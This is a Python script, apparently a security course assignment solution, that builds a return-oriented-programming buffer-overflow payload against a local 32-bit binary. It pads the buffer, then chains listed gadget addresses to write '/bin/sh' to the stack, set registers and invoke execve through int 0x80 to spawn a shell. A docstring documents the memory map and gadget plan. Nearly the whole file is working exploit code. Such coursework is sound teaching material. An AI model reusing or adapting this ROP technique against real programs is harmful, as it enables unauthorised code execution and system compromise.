# author: Kexuan Zou
from struct import pack
'''- Address space
	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x80ee000    0xa6000        0x0 /home/ubuntu/ece422/mp1/1.2.9
	 0x80ee000  0x80f0000     0x2000    0xa5000 /home/ubuntu/ece422/mp1/1.2.9
	 0x80f0000  0x8114000    0x24000        0x0 [heap]
	0xb7fff000 0xb8000000     0x1000        0x0 [vdso]
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]

- Useful gadgetes:
<0x808e97d> mov %eax,(%edx) ; ret
<0x8051750> xor eax, eax ; ret
<0x809a546> inc eax ; ret
<0x8050bbc> inc eax ; pop edi ; ret
<0x80c2356> pop eax ; ret
<0x80481ec> pop ebx ; ret
<0x80e3d46> pop ecx ; ret
<0x805733a> pop edx ; ret
<0x80494f9> int 0x80

- Register values before interrupt
eax = 0x0b
ebx = ptr to "/bin/sh"
ecx = 0x0
edx = 0x0

- Stack value
buf[0] 0x6e69622f
buf[4] 0x68732f2f
buf[8] 0x0

- Code sequence
# store 0x0 into buf[8]
<0x8051750> xor eax, eax ; ret
<0x805733a> pop edx ; ret
    buf+8
<0x808e97d> mov %eax,(%edx) ; ret

# store "/bin/sh" into buf[0] and buf[4]
<0x80c2356> pop eax ; ret
    0x6e69622f
<0x805733a> pop edx ; ret
    buf
<0x808e97d> mov %eax,(%edx) ; ret
<0x80c2356> pop eax ; ret
    0x68732f2f
<0x805733a> pop edx ; ret
    buf+4
<0x808e97d> mov %eax,(%edx) ; ret

# ebx <- addr("/bin/sh"), ecx <- 0, edx <- 0
<0x80481ec> pop ebx ; ret
    buf
<0x80e3d46> pop ecx ; ret
    buf+8
<0x805733a> pop edx ; ret
    buf+8

# eax <- 11
<0x8051750> xor eax, eax ; ret
<0x8050bbc> inc eax ; pop edi ; ret
    0x90909090
<0x8050bbc> inc eax ; pop edi ; ret
    0x90909090
<0x8050bbc> inc eax ; pop edi ; ret
    0x90909090
<0x8050bbc> inc eax ; pop edi ; ret
    0x90909090
<0x8050bbc> inc eax ; pop edi ; ret
    0x90909090
<0x8050bbc> inc eax ; pop edi ; ret
    0x90909090
<0x8050bbc> inc eax ; pop edi ; ret
    0x90909090
<0x8050bbc> inc eax ; pop edi ; ret
    0x90909090
<0x8050bbc> inc eax ; pop edi ; ret
    0x90909090
<0x8050bbc> inc eax ; pop edi ; ret
    0x90909090
<0x8050bbc> inc eax ; pop edi ; ret
    0x90909090

# system call
<0x80494f9> int 0x80

- Related address
buf: 0xbffe97ac
arg: 0xbffff57c
ebp: 0xbffe9818
'''
buf = 0xbffe97ac
payload = ''
payload += '\x90'*(108+4)

# store 0x0 into buf[8]
payload += pack('<I', 0x08051750)
payload += pack('<I', 0x0805733a)
payload += pack('<I', buf+8)
payload += pack('<I', 0x0808e97d)

# store "/bin/sh" into buf[0] and buf[4]
payload += pack('<I', 0x080c2356)
payload += pack('<I', 0x6e69622f)
payload += pack('<I', 0x0805733a)
payload += pack('<I', buf)
payload += pack('<I', 0x0808e97d)
payload += pack('<I', 0x080c2356)
payload += pack('<I', 0x68732f2f)
payload += pack('<I', 0x0805733a)
payload += pack('<I', buf+4)
payload += pack('<I', 0x0808e97d)

# ebx <- addr("/bin/sh"), ecx <- 0, edx <- 0
payload += pack('<I', 0x080481ec)
payload += pack('<I', buf)
payload += pack('<I', 0x080e3d46)
payload += pack('<I', buf+8)
payload += pack('<I', 0x0805733a)
payload += pack('<I', buf+8)

# eax <- 11
payload += pack('<I', 0x08051750)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)

# system call
payload += pack('<I', 0x080494f9)

print(payload)
